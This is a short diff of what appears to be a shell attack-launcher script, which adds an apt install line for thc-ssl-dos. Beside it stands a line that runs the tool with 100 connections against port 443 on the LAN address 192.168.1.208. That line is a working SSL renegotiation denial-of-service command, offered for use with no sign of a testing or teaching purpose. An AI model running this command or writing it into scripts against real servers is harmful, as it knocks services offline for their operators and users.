@@ -11,4 +11,5 @@ green='\033[92m'
 clear
 sleep 1.5
 echo -e "$default"
+sudo apt install thc-ssl-dos
 thc-ssl-dos -l 100 192.168.1.208 443 --accept
